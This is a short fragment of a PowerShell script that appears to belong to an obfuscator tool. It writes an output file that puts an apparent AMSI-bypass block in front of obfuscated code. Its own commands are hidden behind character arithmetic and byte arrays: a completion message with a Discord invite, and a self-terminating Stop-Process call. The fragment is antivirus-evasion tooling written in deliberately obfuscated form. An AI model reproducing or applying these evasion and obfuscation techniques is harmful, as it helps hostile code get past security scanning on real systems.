        [System.IO.File]::WriteAllText($nvo,$metadata+$amsi+$confusestart+$nvcode)
        .([char]((5107 - 6740 + 7430 - 5689))+[char](((-11903 -Band 3716) + (-11903 -Bor 3716) - 1512 + 9810))+[char](((-11183 -Band 4507) + (-11183 -Bor 4507) + 8122 - 1343))) ([SYSTEm.TExT.EnCoDinG]::uTf8.GetstRiNg((0x5b, 0x2a, 0x5d))) ([SYsTEM.tExT.ENCOding]::Utf8.GEtstRING((68, 111, 110, 101, 44, 32, 106, 111, 105, 110, 32, 116, 104, 101, 32, 100, 105, 115)) + [sYStEm.texT.eNcOdINg]::uTf8.GEtStRiNG((99, 111, 114, 100, 32, 115, 101, 114, 118, 101, 114, 32, 102, 111, 114, 32, 109, 111, 114, 101, 32)) + [SYSTEm.TEXt.ENCOdINg]::uTF8.geTstRiNg((45))) ([sYSTEM.tExt.ENcODinG]::UTf8.GetStrING((0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x64, 0x69, 0x73, 0x63, 0x6f, 0x72, 0x64, 0x2e, 0x67, 0x67)) + [systEm.TExt.EnCoDiNg]::utF8.gETSTring((47, 0x45, 50, 121, 0x62, 71, 52, 106, 57, 106, 0x55))) -HighlightColor Blue -SequenceColor Magenta;if($nv -notmatch ([SYSTeM.teXT.encOding]::Utf8.gETsTRINg((0x4e, 0x6f, 0x78, 0x69)))){.([char](((2502 -Band 7510) + (2502 -Bor 7510) - 6104 - 3793))+[char](((-6898 -Band 6959) + (-6898 -Bor 6959) - 8971 + 9022))+[char]((18774 - 9290 - 8964 - 408))+[char]((6050 - 4723 + 3263 - 4475))) -Id $pid}
        log "[/]" "Press any key to exit" -HighlightColor Yellow
        [System.Console]::ReadKey() > $null}}